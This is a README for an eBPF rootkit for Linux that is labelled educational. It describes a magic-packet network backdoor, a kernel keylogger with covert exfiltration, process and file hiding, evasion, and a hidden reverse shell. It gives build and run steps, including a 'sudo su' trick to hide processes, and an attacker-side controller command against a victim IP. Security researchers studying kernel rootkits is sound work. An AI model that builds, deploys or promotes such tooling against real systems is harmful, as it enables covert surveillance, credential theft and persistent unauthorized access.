# Rootkit eBPF

A simple and educational eBPF rootkit designed for modern Linux kernels.

## Features

- **Network Backdoor**
  An XDP filter, filtering network packets for magic payloads and parses commands from these packets.
- **Keylogger**
  Kernel level keylogger capturing keyboard input and seding over hidden communication.
- **Process and File Hiding**
  Hiding processes recursively on every fork. Also, hiding files on the file system.
- **Evasion Techniques**
  Utilizes fundamental strategies to avoid detection.
- **Reverse Shell**
  The loader process spawns a reverse shell and the rootkit hides it.

## ⚠️ Disclaimer

> **Warning:** This project is intended for educational and research purposes only.  
> Unauthorized deployment or use of rootkits is illegal and unethical.

## General Description

This rootkit operates as a kernel-level backdoor. It sets up an XDP filter to inspect all packets (currently focusing on UDP) for predefined "magic" payloads. If such a payload is found, the rootkit, parses the command that packet holds and then drops the packet before it reaches userspace.

## Installation & Prerequisites

### Prerequisites

Ensure your system meets the following requirements before building:

* **OS:** Linux Kernel `>= 5.8` (requires `fexit` support)

#### Install Dependencies (Ubuntu / Debian)

```bash
sudo apt update
sudo apt install -y \
    clang \
    llvm \
    libbpf-dev \
    linux-tools-common \
    linux-tools-$(uname -r) \
    build-essential \
    pkg-config
```

### Installation

```bash
bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h
make clean && make

# Executable in ./build/. Will be hidden at runtime by rootkit.

# Running through sudo su to hide sudo process
sudo su
./build/rootkit
```

## Usage

- A controller script (`controller/controller.py`, written in Python 3) is provided to run on the attacker’s machine and interact with the rootkit’s backdoor functionality.
- Everything is configurable in `config.h` and `userspace/config.h`.

### Example Usage
```bash
# From attacker:
sudo python3 controller.py -i <iface> <victim_ip> hide_file "Rootkit-eBPF"
```